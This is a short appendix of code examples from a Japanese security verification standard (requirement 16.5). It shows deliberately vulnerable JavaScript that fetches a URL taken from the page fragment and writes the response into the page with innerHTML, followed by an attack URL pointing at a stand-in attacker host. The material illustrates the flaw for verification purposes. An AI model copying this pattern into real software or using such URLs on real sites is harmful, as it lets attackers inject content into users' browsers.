# 付録 C: コード例

この付録では必要に応じてコード例を示します。

# V16: ファイルおよびリソース検証要件
| **16.5** | 信頼できないデータはクロスドメインリソース共有 (CORS) 内で使用されておらず、任意のリモートコンテンツから保護していることを検証します。 | ✓ | ✓ | ✓ | 2.0 |

```
<script>

var req = new XMLHttpRequest();

req.onreadystatechange = function() {
     if(req.readyState==4 && req.status==200) {
          document.getElementById("div1").innerHTML=req.responseText;
     }
}

var resource = location.hash.substring(1);
req.open("GET",resource,true);
req.send();
</script>
```
```
<body>
<div id="div1"></div>
</body>
```
http://example.foo/main.php#profile.php

攻撃者は以下のような URL を使用して上記のケースを悪用できます。

http://example.foo/main.php#http://attacker.bar/file.php
